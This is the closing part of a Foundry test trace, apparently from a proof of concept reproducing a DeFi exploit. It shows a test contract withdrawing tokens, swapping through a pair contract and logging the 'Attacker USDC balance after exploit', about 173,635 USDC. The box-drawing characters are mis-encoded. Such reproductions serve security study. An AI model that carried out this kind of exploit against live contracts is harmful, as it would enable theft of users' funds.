    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdraw(param0: 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E, param1: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param2: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, param3: 368503794025 [3.685e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000000000055cc89a969
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 368503794025 [3.685e11]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 368503794025 [3.685e11]
    в”‚   в”‚   в”‚   в”њв”Ђ [24628] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 368503794025 [3.685e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23928] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 368503794025 [3.685e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 368503794025 [3.685e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ emit Withdraw(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 368503794025 [3.685e11], param3: 1844317480751 [1.844e12])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000000000055cc89a969
    в”‚   в”‚   в”њв”Ђ [4728] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::transfer(0xf4003F4efBE8691B60249E6afbD307aBE7758adb, 194867977364 [1.948e11])
    в”‚   в”‚   в”‚   в”њв”Ђ [4028] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::transfer(0xf4003F4efBE8691B60249E6afbD307aBE7758adb, 194867977364 [1.948e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xf4003F4efBE8691B60249E6afbD307aBE7758adb, value: 194867977364 [1.948e11])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [2491] 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7::balanceOf(0xf4003F4efBE8691B60249E6afbD307aBE7758adb) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 251849339333914359565739 [2.518e23]
    в”‚   в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(0xf4003F4efBE8691B60249E6afbD307aBE7758adb) [staticcall]
    в”‚   в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(0xf4003F4efBE8691B60249E6afbD307aBE7758adb) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 2976450048997 [2.976e12]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 2976450048997 [2.976e12]
    в”‚   в”њв”Ђ emit Sync(reserve0: 251849339333914359565739 [2.518e23], reserve1: 2976450048997 [2.976e12])
    в”‚   в”њв”Ђ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 194867977364 [1.948e11], amount0Out: 0, amount1Out: 194283372435 [1.942e11], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [1226] 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [529] 0xa3fa3D254bf6aF295b5B22cC6730b04144314890::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 173635816661 [1.736e11]
    в”‚   в””в”Ђ в†ђ [Return] 173635816661 [1.736e11]
    в”њв”Ђ emit log_named_decimal_uint(key: "[End] Attacker USDC balance after exploit", val: 173635816661 [1.736e11], decimals: 6)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 272.83ms (12.29ms CPU time)

Ran 2 test suites in 575.50ms (534.83ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
